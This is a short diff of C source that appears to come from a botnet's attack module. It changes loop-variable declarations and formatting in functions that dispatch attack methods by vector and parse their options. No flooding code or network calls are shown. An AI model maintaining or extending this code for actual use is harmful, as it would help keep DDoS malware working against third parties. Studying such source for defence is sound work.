@@ -171,9 +171,9 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
     }
     else
     {
-        int i;
+        //int i;
 
-        for (i = 0; i < methods_len; i++)
+        for (int i = 0; i < methods_len; i++)
         {
             if (methods[i]->vector == vector)
             {
@@ -192,12 +192,11 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
 
 char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
 {
-    int i;
+    //int i;
 
-    for (i = 0; i < opts_len; i++)
+    for (int i = 0; i < opts_len; i++)
     {
-        if (opts[i].key == opt)
-            return opts[i].val;
+        if (opts[i].key == opt) return opts[i].val;
     }
 
     return def;
@@ -236,12 +235,12 @@ static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
 
 static void free_opts(struct attack_option *opts, int len)
 {
-    int i;
+    //int i;
 
     if (opts == NULL)
         return;
 
-    for (i = 0; i < len; i++)
+    for (int i = 0; i < len; i++)
     {
         if (opts[i].val != NULL)
             free(opts[i].val);
